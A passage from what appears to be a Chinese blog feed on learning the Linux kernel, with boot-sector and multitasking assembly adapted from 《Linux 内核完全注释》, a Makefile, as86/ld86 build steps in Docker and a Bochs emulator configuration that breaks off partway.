0,0,0</span><br><span class="line">gdt_48:</span><br><span class="line">    .word   0x07FF,0x7C00+gdt,0</span><br><span class="line"></span><br><span class="line">.org 510</span><br><span class="line">    .word   0xAA55</span><br></pre></td></tr></table></figure><p>这段汇编程序，通过 <code>load_system</code> 标识符标识的这段程序表明需要加载0号磁盘,0号磁头,0号磁道,从第2扇区开始,连续17个扇区的内容(这里将存储支持任务切换的程序)，加载到内存以 0x1000 开始的物理地址处。</p><p><code>continue_load</code> 标识将 0x1000 物理地址开始的 4096 字 (即 8192 字节) 的内容依次复制到以 0x0000 开始的物理地址处。</p><p>其后，设置 IDT (中断描述符表)、IDTR(中断描述符表寄存器) 及 GDT(全局描述符表)、GDTR(全局描述符表寄存器)，将 CPU 运行模式改成 <code>保护模式</code> ，继而将控制权转交给这个被加载进来的程序。</p><h2 id="多任务程序"><a href="#多任务程序" class="headerlink" title="多任务程序"></a>多任务程序</h2><p><small>主体内容来自《Linux 内核完全注释》，经过一定量改变以适应当前运行环境</small><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br></pre></td><td class="code"><pre><span class="line"># head.s</span><br><span class="line">.code32</span><br><span class="line">LATCH = 11930</span><br><span class="line">SCRN_SEL = 0x18</span><br><span class="line">TSS0_SEL = 0x20</span><br><span class="line">LDT0_SEL = 0x28</span><br><span class="line">TSS1_SEL = 0x30</span><br><span class="line">LDT1_SEL = 0x38</span><br><span class="line"></span><br><span class="line">.text</span><br><span class="line">.globl startup_32</span><br><span class="line">startup_32:</span><br><span class="line"></span><br><span class="line">    movl $0x00000010,%eax       # 段选择符 2</span><br><span class="line">    mov %ax,%ds                </span><br><span class="line">    lss init_stack,%esp         # Load Far Pointer 加载到 SS:ESP </span><br><span class="line"></span><br><span class="line">    call setup_idt              # 设置中断描述符表</span><br><span class="line">    call setup_gdt              # 设置全局描述符表</span><br><span class="line">    movl $0x00000010,%eax</span><br><span class="line">    mov %ax,%ds</span><br><span class="line">    mov %ax,%es</span><br><span class="line">    mov %ax,%fs</span><br><span class="line">    mov %ax,%gs</span><br><span class="line">    lss init_stack,%esp         # Load Far Pointer 加载到 SS:ESP</span><br><span class="line"></span><br><span class="line"># 设置 8253 定时芯片 10s 一个中断</span><br><span class="line">    movb $0x36,%al  </span><br><span class="line">    movl $0x00000043,%edx</span><br><span class="line">    outb %al,%dx</span><br><span class="line">    movl $LATCH,%eax</span><br><span class="line">    movl $0x40,%edx</span><br><span class="line">    outb %al,%dx</span><br><span class="line">    movb %ah,%al</span><br><span class="line">    outb %al,%dx</span><br><span class="line"></span><br><span class="line">    movl $0x00080000,%eax       # 重新设置 int 0x08 时钟中断</span><br><span class="line">    movw $timer_interrupt,%ax</span><br><span class="line">    movw $0x8E00,%dx</span><br><span class="line">    movl $0x08,%ecx</span><br><span class="line">    lea idt(,%ecx,8),%esi</span><br><span class="line">    movl %eax,(%esi)</span><br><span class="line">    movl %edx,4(%esi)</span><br><span class="line">    movw $system_interrupt,%ax  # 重新设置 int 0x80 系统中断</span><br><span class="line">    movw $0xef00,%dx</span><br><span class="line">    movl $0x80,%ecx</span><br><span class="line">    lea idt(,%ecx,8),%esi</span><br><span class="line">    movl %eax,(%esi)</span><br><span class="line">    movl %edx,4(%esi)</span><br><span class="line"></span><br><span class="line">    pushfl                      # 重置 EFLAGS 嵌套任务标志位</span><br><span class="line">    andl $0xffffbfff,(%esp)</span><br><span class="line">    popfl</span><br><span class="line">    movl $TSS0_SEL,%eax</span><br><span class="line">    ltr %ax                     # Load Task Register</span><br><span class="line">    movl $LDT0_SEL,%eax</span><br><span class="line">    lldt %ax                    # Load Local Descriptor Register</span><br><span class="line">    movl $0,current</span><br><span class="line">    sti                         # set interrupt flag</span><br><span class="line">    pushl $0x17</span><br><span class="line">    pushl $init_stack</span><br><span class="line">    pushfl</span><br><span class="line">    pushl $0x0f</span><br><span class="line">    pushl $task0</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setup_gdt:</span><br><span class="line">    lgdt lgdt_opcode</span><br><span class="line">    ret</span><br><span class="line">setup_idt:</span><br><span class="line">    lea ignore_int,%edx         # 预先把中断处理程序的偏移地址 ignore_int 存到 EDX</span><br><span class="line">    movl $0x00080000,%eax       # 预存 0x0008 - 段选择符</span><br><span class="line">    movw %dx,%ax                # 补上 0-15 位偏移地址</span><br><span class="line">    movw $0x8E00,%dx            # DX 补上标志位</span><br><span class="line">    lea idt,%edi</span><br><span class="line">    mov $256,%ecx</span><br><span class="line">rp_idt: movl %eax,(%edi)        # 循环 256 遍处理 IDT</span><br><span class="line">    movl %edx,4(%edi)</span><br><span class="line">    addl $8,%edi</span><br><span class="line">    dec %ecx</span><br><span class="line">    jne rp_idt</span><br><span class="line">    lidt lidt_opcode</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_char:</span><br><span class="line">    push %gs</span><br><span class="line">    pushl %ebx</span><br><span class="line">    mov $SCRN_SEL,%ebx</span><br><span class="line">    mov %bx,%gs</span><br><span class="line">    movl scr_loc,%ebx</span><br><span class="line">    shl $1,%ebx</span><br><span class="line">    movb %al,%gs:(%ebx)</span><br><span class="line">    shr $1,%ebx</span><br><span class="line">    incl %ebx</span><br><span class="line">    cmpl $2000,%ebx</span><br><span class="line">    jb 1f</span><br><span class="line">    movl $0,%ebx</span><br><span class="line">1:  movl %ebx,scr_loc</span><br><span class="line">    popl %ebx</span><br><span class="line">    pop %gs</span><br><span class="line">    ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">ignore_int:                 # 默认的中断处理程序</span><br><span class="line">    push %ds</span><br><span class="line">    pushl %eax</span><br><span class="line">    movl $0x10,%eax</span><br><span class="line">    mov %ax,%ds</span><br><span class="line">    movl $67,%eax</span><br><span class="line">    call write_char</span><br><span class="line">    popl %eax</span><br><span class="line">    pop %ds</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">timer_interrupt:            # 定时中断处理程序</span><br><span class="line">    push %ds</span><br><span class="line">    pushl %eax</span><br><span class="line">    movl $0x10,%eax</span><br><span class="line">    mov %ax,%ds</span><br><span class="line">    movb $0x20,%al</span><br><span class="line">    outb %al,$0x20</span><br><span class="line">    movl $1,%eax</span><br><span class="line">    cmpl %eax,current</span><br><span class="line">    je 1f</span><br><span class="line">    movl %eax,current</span><br><span class="line">    jmp $TSS1_SEL, $0</span><br><span class="line">    jmp 2f</span><br><span class="line">1:  movl $0,current</span><br><span class="line">    jmp $TSS0_SEL, $0</span><br><span class="line">2:  popl %eax</span><br><span class="line">    pop %ds</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">system_interrupt:           # 系统调用中断处理程序</span><br><span class="line">    push %ds</span><br><span class="line">    pushl %edx</span><br><span class="line">    pushl %ecx</span><br><span class="line">    pushl %ebx</span><br><span class="line">    pushl %eax</span><br><span class="line">    movl $0x10,%edx</span><br><span class="line">    mov %dx,%ds</span><br><span class="line">    call write_char</span><br><span class="line">    popl %eax</span><br><span class="line">    popl %ebx</span><br><span class="line">    popl %ecx</span><br><span class="line">    popl %edx</span><br><span class="line">    pop %ds</span><br><span class="line">    iret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current:.long 0</span><br><span class="line">scr_loc:.long 0</span><br><span class="line"></span><br><span class="line">.align 4</span><br><span class="line">lidt_opcode:</span><br><span class="line">    .word 256*8-1</span><br><span class="line">    .long idt</span><br><span class="line">lgdt_opcode:</span><br><span class="line">    .word (end_gdt-gdt)-1</span><br><span class="line">    .long gdt</span><br><span class="line"></span><br><span class="line">.align 8</span><br><span class="line">idt:    .fill 256,8,0</span><br><span class="line"></span><br><span class="line">gdt:    .quad 0x0000000000000000</span><br><span class="line">        .quad 0x00c09a00000007ff</span><br><span class="line">        .quad 0x00c09200000007ff</span><br><span class="line">        .quad 0x00c0920b80000002</span><br><span class="line">        .word 0x68,tss0,0xe900,0x0</span><br><span class="line">        .word 0x40,ldt0,0xe200,0x0</span><br><span class="line">        .word 0x68,tss1,0xe900,0x0</span><br><span class="line">        .word 0x40,ldt1,0xe200,0x0</span><br><span class="line">end_gdt:</span><br><span class="line">        .fill 128,4,0</span><br><span class="line">init_stack:</span><br><span class="line">    .long init_stack</span><br><span class="line">    .word 0x0010</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.align 8</span><br><span class="line">ldt0:   .quad 0x0000000000000000</span><br><span class="line">        .quad 0x00c0fa00000003ff</span><br><span class="line">        .quad 0x00c0f200000003ff</span><br><span class="line"></span><br><span class="line">tss0:   .long 0</span><br><span class="line">        .long krn_stk0, 0x10</span><br><span class="line">        .long 0,0,0,0,0</span><br><span class="line">        .long 0,0,0,0,0</span><br><span class="line">        .long 0,0,0,0,0</span><br><span class="line">        .long 0,0,0,0,0,0</span><br><span class="line">        .long LDT0_SEL,0x8000000</span><br><span class="line"></span><br><span class="line">        .fill 128,4,0</span><br><span class="line">krn_stk0:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.align 8</span><br><span class="line">ldt1:   .quad 0x0000000000000000</span><br><span class="line">        .quad 0x00c0fa00000003ff</span><br><span class="line">        .quad 0x00c0f200000003ff</span><br><span class="line"></span><br><span class="line">tss1:   .long 0</span><br><span class="line">        .long krn_stk1,0x10</span><br><span class="line">        .long 0,0,0,0,0</span><br><span class="line">        .long task1,0x200</span><br><span class="line">        .long 0,0,0,0</span><br><span class="line">        .long usr_stk1,0,0,0</span><br><span class="line">        .long 0x17,0x0f,0x17,0x17,0x17,0x17</span><br><span class="line">        .long LDT1_SEL,0x8000000</span><br><span class="line"></span><br><span class="line">        .fill 128,4,0</span><br><span class="line">krn_stk1:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">task0:</span><br><span class="line">    movl $0x17,%eax</span><br><span class="line">    movw %ax,%ds</span><br><span class="line">    mov $65,%al</span><br><span class="line">    int $0x80</span><br><span class="line">    movl $0xfff,%ecx</span><br><span class="line">1:  loop 1b</span><br><span class="line">    jmp task0</span><br><span class="line">task1:</span><br><span class="line">    mov $66,%al</span><br><span class="line">    int $0x80</span><br><span class="line">    movl $0xfff,%ecx</span><br><span class="line">1:  loop 1b</span><br><span class="line">    jmp task1</span><br><span class="line"></span><br><span class="line">    .fill 128,4,0</span><br><span class="line">usr_stk1:</span><br></pre></td></tr></table></figure></p><p>上面的这个程序内容不再详述，想了解细节请参考 《Linux 内核完全注释》</p><p>下面提供编译 <code>boot.s</code> 以及 <code>head.s</code> 的可用 Makefile</p><p>首先描述一下额外的工具版本</p><ul><li>GNU as : GNU assembler version 2.26.1 </li><li>GNU ld : GNU ld 2.26.1<br>其它内容详见 <a href="https://dormouse-none.github.io/2018-08-19-understand-Kernel-0/">理解 Linux Kernel (0)</a></li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Makefile for the simple example kernel.</span></span><br><span class="line">AS86=as86 -0 -a</span><br><span class="line">LD86=ld86 -0</span><br><span class="line">AS=as</span><br><span class="line">ASFLAGS =-32</span><br><span class="line">LD=ld</span><br><span class="line">LDFLAGS=-s -x -M -m elf_i386 -e startup_32 -Ttext 0x0</span><br><span class="line"></span><br><span class="line"><span class="section">all:Image</span></span><br><span class="line"></span><br><span class="line"><span class="section">Image: boot system</span></span><br><span class="line">dd bs=32 if=boot of=Image skip=1</span><br><span class="line">dd bs=512 if=system of=Image skip=8 seek=1</span><br><span class="line">sync</span><br><span class="line"></span><br><span class="line"><span class="section">disk: Image</span></span><br><span class="line">dd bs=8192 if=Image of=/dev/fd0</span><br><span class="line">sync;sync;sync</span><br><span class="line"></span><br><span class="line"><span class="section">head.o: </span></span><br><span class="line"><span class="variable">$(AS)</span> <span class="variable">$(ASFLAGS)</span> -o head.o head.s</span><br><span class="line"></span><br><span class="line"><span class="section">system:head.o </span></span><br><span class="line"><span class="variable">$(LD)</span> <span class="variable">$(LDFLAGS)</span> head.o  -o system &gt; System.map</span><br><span class="line"></span><br><span class="line"><span class="section">boot:boot.s</span></span><br><span class="line"><span class="variable">$(AS86)</span> -o boot.o boot.s</span><br><span class="line"><span class="variable">$(LD86)</span> -s -o boot boot.o</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">rm -f Image System.map core boot *.o system</span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>想了解更多细节的请自行实操查看吧!</p><p><img src="https://ws1.sinaimg.cn/large/006tNbRwgy1fun1fvafhwg30k40d4x6p.gif" alt=""></p><h2 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h2><p><a href="https://raw.githubusercontent.com/DorMOUSE-None/Repo/master/understand-kernel-2.zip" target="_blank" rel="noopener">程序源码</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  __                    __                  </span><br><span class="line"> / _| __ _ _ __   __ _ / _| ___ _ __   __ _ </span><br><span class="line">| |_ / _` | &apos;_ \ / _` | |_ / _ \ &apos;_ \ / _` |</span><br><span class="line">|  _| (_| | | | | (_| |  _|  __/ | | | (_| |</span><br><span class="line">|_|  \__,_|_| |_|\__, |_|  \___|_| |_|\__, |</span><br><span class="line">                 |___/                |___/</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;《只是为了好玩》一书中，林纳斯描述过他最早的试验性程序就是让 CPU 执行两个不同的任务(一个不断输出A，另一个输出B)，同时不断地让 CPU 在两个任务间的切换。&lt;/p&gt;
&lt;p&gt;结合《Linux 内核完全注释》一书，得到了多任务切换的示例程序。&lt;/p&gt;
&lt;p&gt;本节所要描述的内容，正是结合一个框架式的汇编程序(多任务切换程序, 书中提供的内容比较老，无法适应目前的各种工具、环境)，在现有环境中加以处理并成功运行。&lt;/p&gt;
&lt;p&gt;关于运行环境的说明，欢迎参考 &lt;a href=&quot;https://dormouse-none.github.io/2018-08-19-understand-Kernel-0/&quot;&gt;理解 Linux Kernel (0)&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://DorMOUSE-None.github.io/tags/Linux/"/>
    
      <category term="Kernel" scheme="https://DorMOUSE-None.github.io/tags/Kernel/"/>
    
      <category term="Multi-Task" scheme="https://DorMOUSE-None.github.io/tags/Multi-Task/"/>
    
  </entry>
  
  <entry>
    <title>理解 Linux Kernel (1) - BIOS</title>
    <link href="https://DorMOUSE-None.github.io/2018-08-19-understand-Kernel-1/"/>
    <id>https://DorMOUSE-None.github.io/2018-08-19-understand-Kernel-1/</id>
    <published>2018-08-18T16:00:00.000Z</published>
    <updated>2018-08-19T08:22:30.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在<a href="https://dormouse-none.github.io/2018-08-19-understand-Kernel-0/">概述</a>，我想我已经介绍过我开始这一些列博文的原因。<br>我不能担保我所进行的所有试验性操作都是对的，但是，至少这些在我所描述的环境下成功的运行了起来，并帮助我触及我始终敬畏而又敬而远之的<strong>硬件&amp;OS</strong></p><p>在《Linux内核完全注释》一书第三章——内核编程语言和环境，描述了用 as86 汇编语言构建 boot 引导程序，并最终通过 Bochs 仿真器在模拟开机通电后，BIOS Load<br>boot 程序，通过显示器输出 <em>Loading System…</em> 。</p><p>这些，将是这里所要描述的主要内容。</p><a id="more"></a><h2 id="boot-s-汇编程序"><a href="#boot-s-汇编程序" class="headerlink" title="boot.s 汇编程序"></a>boot.s 汇编程序</h2><p>这里没法多说，都是书中的源码，只是供未读过书的读者参考，特意摘录了下来(不过，就不加注释了)</p><p>boot.s 源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.global begtext, begdata, begbss, endtext, enddata, endbss</span><br><span class="line">.text</span><br><span class="line">begtext:</span><br><span class="line">.data</span><br><span class="line">begdata:</span><br><span class="line">.bss</span><br><span class="line">begbss:</span><br><span class="line">.text</span><br><span class="line">BOOTSEG=0x07c0</span><br><span class="line"></span><br><span class="line">entry start</span><br><span class="line">start:</span><br><span class="line">    jmpi    go,BOOTSEG</span><br><span class="line">go: mov ax,cs</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov es,ax</span><br><span class="line">    mov [msg+17],ah</span><br><span class="line">    mov cx,#20</span><br><span class="line">    mov dx,#0x1004</span><br><span class="line">    mov bx,#0x000c</span><br><span class="line">    mov bp,#msg</span><br><span class="line">    mov ax,#0x1301</span><br><span class="line">    int 0x10</span><br><span class="line">loop1:  jmp loop1</span><br><span class="line">msg:    .ascii  &quot;Loading System...&quot;</span><br><span class="line">        .byte   13,10</span><br><span class="line">.org    510</span><br><span class="line">.word   0xAA55</span><br><span class="line">.text</span><br><span class="line">endtext:</span><br><span class="line">.data</span><br><span class="line">enddata:</span><br><span class="line">.bss</span><br><span class="line">endbss:</span><br></pre></td></tr></table></figure><p>这段程序的主要的执行流程将是:</p><ol><li>通过 BIOS 加载这段 boot 引导程序</li><li>红色字体打印 <em>Loading System…</em> 并响铃</li><li>指令自循环 (<code>loop1 jmp loop1</code>) ，将始终展示上述字样，并不接收命令</li></ol><p>下面就该把这个汇编程序 <em>编译 + 链接</em> 成 boot 引导程序。</p><p>虽然在 macOS 上确实找到了一个 as86 汇编器(来自 nasm 的一个编译选项，但我不知道为什么始终无法正常编译，也可能这个根本就不是我想要的)。</p><p>通过 docker 容器部署的 Ubuntu，可以很容易地得到一个 as86 汇编程序。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bin86   <span class="comment"># as86, ld86 都在这个包里提供了</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这句需要在宿主机上执行</span></span><br><span class="line">docker cp boot.s linux:/root/boot.s     <span class="comment"># 这里 linux 是我 docker 部署的 Ubuntu 的容器的名称。   如果之前 boot.s 在宿主机上，可以这样拷贝到容器中</span></span><br><span class="line"></span><br><span class="line">as86 -0 -a -o boot.o boot.s             <span class="comment"># 编译</span></span><br><span class="line"></span><br><span class="line">ld86 -0 -s -o execfile boot.o           <span class="comment"># 链接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当然，到这里为止，其实都可以理解成在将汇编代码编译链接成可执行程序 (和 boot 引导程序没有太大关系，唯一有关系的就是这段汇编语言是以引导为目的写的)</span></span><br><span class="line"></span><br><span class="line">dd bs=32 <span class="keyword">if</span>=execfile of=boot skip=1     <span class="comment"># 这里去掉可执行程序的前 32 字节，形成刚好 512 字节的 boot 引导程序</span></span><br></pre></td></tr></table></figure><h2 id="用仿真器启动引导程序"><a href="#用仿真器启动引导程序" class="headerlink" title="用仿真器启动引导程序"></a>用仿真器启动引导程序</h2><p>事实上，这部分内容，我始终没有搞清楚 <strong>磁盘映像文件</strong> 和 <strong>boot 引导程序</strong> 间的关系(当然还有 floppy 和 ata0~3)</p><p>在上一节成功拿到 <em>512B</em> 的 boot 引导程序之后，直接使用这个貌似我也运行成功了(根本就不需要创建磁盘映像文件并将引导程序写入映像文件中，不过，也许只是因为这个引导程序太简单了，根本就不需要其他程序的配合。它最后就是一个死循环 )</p><p>总之，先按照最简单的来吧。</p><p>把 boot 引导程序拷贝到宿主机上(貌似频繁地在两个OS上交互文件，这个很无奈，docker容器中的进程难以启动显示程序)</p><ol><li>在宿主机新建一个目录 <em>linux-boot</em></li><li>拷贝 boot 引导程序到宿主机上 <code>docker cp linux:/root/boot linux-boot/</code></li><li>在 <em>linux-boot</em> 下建立 bochsrc 文件(这将是整个仿真器的配置，用于模拟组装机器涉及的 CPU, 内存, BIOS, 显示器等)</li><li>这里使用的配置文件如下:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># You may now use double quotes around pathnames, in case</span><br><span class="line"># your pathname includes spaces.</span><br><span class="line"></span><br><span class="line">cpu: model=pentium, count=1, ips=50000000, reset_on_triple_fault=1, ignore_bad_msrs=1, msrs=&quot;msrs.def&quot;</span><br><span class="line">cpu: cpuid_limit_winnt=0</span><br><span class="line"></span><br><span class="line">memory: guest=512, host=256</span><br><span class="line"></span><br><span class="line">romimage: file=$BXSHARE/BIOS-bochs-legacy, options=fastboot     # BIOS 配置</span><br><span class="line"></span><br><span class="line">vgaromimage: file=$BXSHARE/VGABIOS-lgpl-latest</span><br><span class="line"></span><br><span class="line">mouse: enabled=0</span><br><span class="line"></span><br><span class="line">pci: enabled=1, chipset=i440fx</span><br><span class="line"></span><br><span class="line">private_colormap: enabled=0</span><br><span class="line"></span><br><span class="line">floppya: 1\_44=&quot;./boot&quot;, status=inserted         # 装载一个软盘 A ，这里用当前目录下的 boot (boot 引导程序，事实上书中说要用 .img 磁盘映像文件，但这里不影响实际效果)</span><br><span class="line"></span><br><span class="line">ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14</span><br><span class="line">ata1: enabled=1, ioaddr1=0x170, ioaddr2=0x370, irq=15</span><br><span class="line">ata2: enabled=0, ioaddr1=0x1e8, ioaddr2=0x3e0, irq=11</span><br><span class="line">ata3: enabled=0, ioaddr1=0x168, ioaddr2=0x360, irq=9</span><br><span class="line"></span><br><span class="line">boot: a                                         # 配置引导程序所在的磁盘</span><br><span class="line"></span><br><span class="line">floppy_bootsig_check: disabled=0</span><br><span class="line"></span><br><span class="line">log: bochsout.txt</span><br><span class="line"></span><br><span class="line">panic: action=ask</span><br><span class="line">error: action=report</span><br><span class="line">info: 